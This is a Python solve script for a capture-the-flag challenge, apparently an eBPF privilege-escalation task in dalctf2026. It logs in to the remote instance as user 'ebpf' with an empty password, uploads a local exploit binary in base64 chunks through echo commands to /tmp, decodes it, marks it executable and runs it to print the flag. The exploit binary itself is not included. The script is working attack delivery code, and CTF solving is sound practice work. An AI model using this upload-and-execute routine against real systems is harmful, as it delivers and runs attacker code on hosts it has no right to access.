#!/usr/bin/env python3
import argparse
import base64
import re
import socket
import sys
import time
from pathlib import Path


def recv_until(sock, markers, timeout=90):
    end = time.time() + timeout
    data = b""
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if any(marker in data for marker in markers):
                return data
        except socket.timeout:
            pass
    return data


def run_cmd(sock, cmd, timeout=15):
    sock.sendall(cmd.encode() + b"\n")
    return recv_until(sock, [b"$ "], timeout=timeout)


def build_payload():
    payload_path = Path(__file__).with_name("exploit_min")
    if not payload_path.exists():
        raise FileNotFoundError("exploit_min not found next to solve.py")
    b64 = base64.b64encode(payload_path.read_bytes()).decode()
    return [b64[i:i + 200] for i in range(0, len(b64), 200)]


def solve(host, port):
    chunks = build_payload()

    sock = socket.create_connection((host, port), timeout=15)
    sock.settimeout(20)

    data = recv_until(sock, [b"login:"], timeout=120)
    if b"login:" not in data:
        raise RuntimeError("login prompt not found")

    sock.sendall(b"ebpf\n")
    data = recv_until(sock, [b"Password:"], timeout=30)
    if b"Password:" not in data:
        raise RuntimeError("password prompt not found")

    sock.sendall(b"\n")
    data = recv_until(sock, [b"$ "], timeout=30)
    if b"$ " not in data:
        raise RuntimeError("shell prompt not found")

    run_cmd(sock, ": >/tmp/ex.b64", timeout=10)
    for idx, chunk in enumerate(chunks):
        out = run_cmd(sock, f"echo '{chunk}' >> /tmp/ex.b64", timeout=10)
        if b"$ " not in out:
            raise RuntimeError(f"failed while uploading chunk {idx}")

    sock.sendall(
        b"base64 -d /tmp/ex.b64 > /tmp/ex && chmod +x /tmp/ex && "
        b"/chal >/dev/null 2>&1 && /tmp/ex; echo __DONE__$?\n"
    )
    out = recv_until(sock, [b"__DONE__"], timeout=30)
    text = out.decode("latin1", "replace")

    match = re.search(r"(dalctf\{[^\s\x00]+\})", text)
    if not match:
        sys.stdout.write(text)
        raise RuntimeError("flag not found")

    flag = match.group(1)
    print(flag)
    return flag


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="instancer.dalctf2026.com")
    parser.add_argument("--port", type=int, required=True)
    args = parser.parse_args()
    solve(args.host, args.port)


if __name__ == "__main__":
    main()
